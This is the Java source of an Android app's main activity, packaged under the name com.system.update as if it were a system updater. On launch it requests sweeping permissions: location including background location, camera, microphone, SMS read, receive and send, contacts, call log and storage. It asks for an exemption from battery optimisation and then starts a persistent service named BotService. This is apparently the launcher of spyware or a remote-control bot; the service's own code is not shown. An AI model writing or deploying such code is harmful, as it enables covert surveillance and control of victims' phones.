package com.system.update;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.*;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b){
        super.onCreate(b);
        List<String> need = new ArrayList<>();
        String[] perms = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        for(String p : perms){
            if(ContextCompat.checkSelfPermission(this,p)!=PackageManager.PERMISSION_GRANTED)
                need.add(p);
        }
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.Q) need.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.TIRAMISU) need.add("android.permission.POST_NOTIFICATIONS");
        if(!need.isEmpty()) ActivityCompat.requestPermissions(this, need.toArray(new String[0]), 1);

        try{
            if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if(!pm.isIgnoringBatteryOptimizations(getPackageName())){
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:"+getPackageName()));
                    startActivity(i);
                }
            }
        }catch(Exception e){}

        Intent svc = new Intent(this, BotService.class);
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) startForegroundService(svc);
        else startService(svc);
    }
}
